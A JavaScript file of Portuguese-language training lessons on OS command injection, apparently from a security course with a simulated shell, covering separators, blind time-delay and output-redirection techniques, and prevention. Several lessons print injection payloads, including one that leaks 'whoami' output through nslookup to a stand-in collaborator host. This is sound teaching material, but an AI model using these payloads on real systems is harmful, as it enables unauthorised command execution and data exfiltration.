window.COURSE_LESSONS['os-command-injection'] = [
  ['Fundamentos', `<span class="lesson-step">01 · FUNDAMENTOS</span><h2>Quando um valor vira sintaxe do sistema operacional</h2><p>OS Command Injection ocorre quando uma aplicação monta uma linha de comando usando entrada não confiável e a entrega a um shell. O problema não é apenas o comando escolhido: metacaracteres podem encerrar um argumento e iniciar outra operação.</p><pre>entrada: productId=381<br>comando pretendido: stockreport.pl 381 29<br><br>entrada alterada: 381 &amp; echo training-marker &amp;<br>interpretação virtual: stockreport.pl 381 | echo training-marker | 29</pre><div class="analogy"><b>Modelo mental:</b> entrada → composição de string → parsing do shell → comandos e efeitos.</div><p>Todos os efeitos deste módulo são interpretados por um shell virtual determinístico. Nenhum processo do sistema operacional é iniciado.</p>`],
  ['Metodologia', `<span class="lesson-step">02 · PROCESSO</span><h2>Comece pelo comportamento válido</h2><ol class="study-list"><li>Capture uma requisição normal no Proxy.</li><li>Envie-a ao Repeater e altere somente um campo.</li><li>Descubra se o valor está em um argumento simples ou entre aspas.</li><li>Teste um separador por vez.</li><li>Compare corpo, tempo e efeitos secundários.</li><li>Registre a correção que elimina a chamada ao shell.</li></ol><div class="compare"><div><small>FUNÇÃO NORMAL</small><pre>productId=381<br>storeId=29<br>→ 18 unidades</pre></div><div><small>HIPÓTESE</small><pre>productId=381 &amp; echo marker &amp;<br>→ marker aparece?</pre></div></div>`],
  ['Saída direta', `<span class="lesson-step">03 · DIRECT OUTPUT</span><h2>Use uma marca controlada antes de buscar impacto</h2><p>Quando a saída do processo é devolvida na resposta HTTP, um comando que produz texto permite confirmar a interpretação do shell.</p><pre>&amp; echo training-marker &amp;</pre><p>Os separadores nas duas extremidades isolam a operação injetada do comando pretendido e dos argumentos seguintes. Depois da confirmação, comandos de identificação podem mostrar somente dados fictícios do ambiente virtual:</p><pre>whoami → www-data-lab<br>uname -a → Linux forge-lab 6.6.0 virtual<br>ver → ForgeOS [Version 10.0.virtual]</pre>`],
  ['Injeção cega por tempo', `<span class="lesson-step">04 · TIME DELAY</span><h2>A ausência de saída não significa ausência de execução</h2><p>Um formulário de feedback pode ignorar stdout e sempre devolver a mesma mensagem. Nesse caso, uma operação que introduz atraso cria um sinal comparável.</p><pre>&amp; ping -c 4 127.0.0.1 &amp;</pre><p>O módulo não espera vários segundos nem envia pacotes. Ele registra <code>simulated_delay_ms</code> e aplica somente uma pequena pausa local para manter os testes rápidos.</p><div class="analogy"><b>Evidência:</b> compare a resposta-base e a resposta alterada várias vezes; não conclua a partir de uma única medição.</div>`],
  ['Redirecionamento de saída', `<span class="lesson-step">05 · VIRTUAL ARTIFACT</span><h2>Separe a execução da recuperação</h2><p>Outra forma de observar uma falha cega é redirecionar a saída para uma área publicada pela aplicação.</p><pre>&amp; whoami &gt; /var/www/static/whoami.txt &amp;</pre><p>Neste módulo, o caminho representa apenas um mapa em memória isolado por lab. A sequência comportamental exige duas ações:</p><ol class="study-list"><li>Enviar a entrada que cria o artefato virtual.</li><li>Abrir a rota local de artefatos e confirmar o conteúdo esperado.</li></ol><p>Nenhum arquivo é criado no computador.</p>`],
  ['Interação OAST virtual', `<span class="lesson-step">06 · OAST</span><h2>Observe um canal secundário sem usar rede</h2><p>Em uma aplicação real autorizada, uma consulta DNS pode revelar que o comando foi interpretado. Aqui, endereços terminados em <code>.collaborator.bscp.local</code> são apenas tokens reconhecidos em memória.</p><pre>&amp; nslookup probe-1.collaborator.bscp.local &amp;</pre><p>O painel “Collaborator virtual” consulta uma rota do próprio servidor em <code>127.0.0.1</code>. Nenhum pacote DNS, HTTP externo ou serviço de terceiros é usado.</p>`],
  ['Exfiltração virtual', `<span class="lesson-step">07 · DATA IN OAST</span><h2>Substituição de comando pode inserir a saída em outro argumento</h2><p>Shells Unix aceitam substituição por <code>$(...)</code> ou crases. O resultado pode acabar incorporado ao hostname observado.</p><pre>&amp; nslookup $(whoami).leak-1.collaborator.bscp.local &amp;<br>→ www-data-lab.leak-1.collaborator.bscp.local</pre><p>O parser local suporta apenas um conjunto fechado de comandos fictícios. A evidência mostra a substituição, o hostname resultante e o evento virtual.</p>`],
  ['Contextos e separadores', `<span class="lesson-step">08 · SHELL SYNTAX</span><h2>O contexto determina qual forma é interpretada</h2><div class="compare"><div><small>WINDOWS E UNIX</small><pre>&amp;<br>&amp;&amp;<br>|<br>||</pre></div><div><small>UNIX</small><pre>;<br>nova linha<br>$(command)<br>&#96;command&#96;</pre></div></div><p>Se o valor estiver entre aspas, primeiro é necessário demonstrar que a entrada saiu desse contexto. Os labs avançados registram <code>quote_context_escaped</code>; inserir apenas uma palavra como <code>whoami</code> nunca conclui o exercício.</p>`],
  ['Prevenção', `<span class="lesson-step">09 · DEFESA</span><h2>Não monte comandos com entrada do usuário</h2><p>A defesa preferida é substituir o utilitário de linha de comando por uma API da linguagem ou da plataforma.</p><ol class="study-list"><li>Use funções tipadas em vez de um shell.</li><li>Valide IDs como números ou valores de uma allowlist.</li><li>Se um processo for inevitável, passe argumentos em uma API que não invoque shell.</li><li>Execute com privilégio mínimo.</li><li>Não confie em escaping manual de metacaracteres.</li><li>Registre e teste os controles no servidor.</li></ol><pre>// preferência<br>stockRepository.get(productId, storeId)<br><br>// nunca<br>shell("stockreport.pl " + productId + " " + storeId)</pre>`],
  ['Vídeo complementar', `<span class="lesson-step">10 · VÍDEO</span><h2>Reforce o conceito com a demonstração indicada</h2><p>Este recurso foi fornecido para complementar o texto e deve ser aberto conscientemente fora do ambiente local. A plataforma não incorpora o player, não carrega thumbnail e não envia requisições automáticas ao YouTube.</p><a class="command-video-card" href="https://youtu.be/8PDDjCW5XWw?si=rTLzLNDQLrlCC0-r" target="_blank" rel="noopener noreferrer"><span>RECURSO EXTERNO · YOUTUBE</span><b>Abrir vídeo sobre OS Command Injection</b><small>O link será aberto em uma nova aba.</small></a><div class="analogy"><b>Depois do vídeo:</b> explique a diferença entre controlar um argumento e controlar a sintaxe interpretada pelo shell.</div>`]
];
